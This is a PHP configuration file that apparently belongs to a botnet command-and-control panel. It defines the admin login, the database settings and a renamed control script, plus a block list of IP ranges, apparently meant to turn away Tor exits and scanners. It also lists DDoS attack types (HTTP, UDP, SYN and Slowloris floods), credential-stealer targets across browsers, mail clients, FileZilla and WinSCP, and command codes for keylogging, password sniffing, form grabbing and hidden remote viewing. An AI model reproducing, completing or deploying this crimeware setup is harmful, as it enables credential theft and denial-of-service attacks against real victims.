<?php

$block_ip = array(
'8.30.234.',
'37.19.198.',
'67.217.160.',
'72.12.194.',
'80.219.36.',
'83.78.247.',
'84.17.52.',
'88.217.152.',
'89.167.131.',
'98.167.185.',
'102.129.143.',
'102.129.152.',
'102.129.153.',
'102.165.48.',
'138.199.10.',
'138.199.13.',
'143.215.130.',
'154.3.40.',
'154.3.42.',
'154.16.192.',
'154.29.131.',
'154.61.71.',
'156.146.36.',
'156.146.48.',
'156.146.62.',
'173.245.209.',
'176.10.99.',
'178.198.76.',
'178.199.49.',
'181.214.61.',
'185.220.101.',
'185.220.102.',
'185.220.103.',
'185.248.101.',
'186.77.196.',
'188.126.94.',
'191.96.150.',
'191.96.185.',
'191.96.227.',
'192.42.123.',
'192.87.28.',
'194.191.248.',
'195.181.175.',
'206.71.168.',
'212.102.36.',
'212.102.37.',
'216.131.75.',
'216.131.89.',
'216.131.111.',
'216.151.184.',
'69.55.5.'//или группа адресов
);
 
foreach($block_ip as $ip) {
    if(strstr($_SERVER["HTTP_X_FORWARDED_FOR"], $ip)) {
        die('Your IP blocked');
    }
}

date_default_timezone_set("Europe/Berlin");	//timezone
ini_set("default_charset","utf-8");	//charset

define("encryptkey",0xAA0488BB);
define("decryptkey",0x33F8F0D2);

$config["admin"] = "millioner";	//admin login name
$config["pass"] = "xxxxxxxxxx";	//admin password - must be changed
	
$config["guest"] = "guest1";	//guest secret key - must be changed

$config["dbhost"] = "localhost";	//change only if other host required
$config["dbname"] = "panel3000";	//mysql database name
$config["dbuser"] = "panel3000";	//mysql database username
$config["dbpass"] = "xxxxxxxx";	//mysql databse password

$config["interval"] = 700;	//interval for check online bots - don't change
$config["cpname"] = "poshelnahuy.php";	//change this and rename "control.php" (recommend)
$config["gpname"] = "guest1.php";	//change this and rename "guest.php" (recommend)

$config["auth"] = 1;	//0 - old basic-auth login, 1 - new web-login
$config["extend_ip"] = 1;	//0 - default ip detection, 1 - fastflux or proxy

//don't change below
$OS = array
(
	0 => "Windows Vista",
	1 => "Windows 7",
	2 => "Windows 8",
	3 => "Windows 8.1",
	4 => "Windows 10",
	5 => "Other"
);

$plugins = array
(
	0 => 0,
	1 => 0,
	2 => 0,
	3 => 0,
	4 => 0,
	5 => 0,
	6 => 0,
	7 => 0,
	8 => 0,
	9 => 0,
	10 => 0,
	11 => 0,
	12 => 0,
	13 => 0
);

$ATTACK = array
(
	0 => "HTTP GET Flood",
	1 => "HTTP POST Flood",
	2 => "Download Flood",
	3 => "UDP Flood",
	4 => "SYN Flood",
	5 => "TCP Flood",
	6 => "HTTPS GET Flood",
	7 => "HTTP Slowloris Flood"
);

$STEALER = array
(
	1 => "Internet Explorer",
	2 => "Firefox",
	3 => "Chrome",
	4 => "Opera",
	5 => "Chromium",
	6 => "Yandex Browser",
	7 => "Amigo Browser",
	8 => "QQ Browser",
	9 => "Outlook",
	10 => "Thunderbird",
	11 => "FileZilla",
	12 => "WinSCP"
);

define("BASE",10000);
define("CMD_ONLINE",BASE + 1);
define("CMD_GETTASK",BASE + 2);
define("CMD_TASKRESULT",BASE + 3);
define("CMD_STEALERRESULT",BASE + 4);
define("CMD_PROCMON",BASE + 5);
define("CMD_PROCMONRESULT",BASE + 6);
define("CMD_FGRESULT",BASE + 7);
define("CMD_PASSSNIFRESULT",BASE + 8);
define("CMD_FSRESULT",BASE + 9);
define("CMD_DDOSRESULT",BASE + 10);
define("CMD_KEYLOGRESULT",BASE + 11);
define("CMD_HIDDENTV",BASE + 12);
define("CMD_HIDDENTVRESULT",BASE + 13);
define("CMD_EMPTY",BASE + 14);
define("CMD_EGRABBERRESULT",BASE + 15);
define("MAGIC",2020);

?>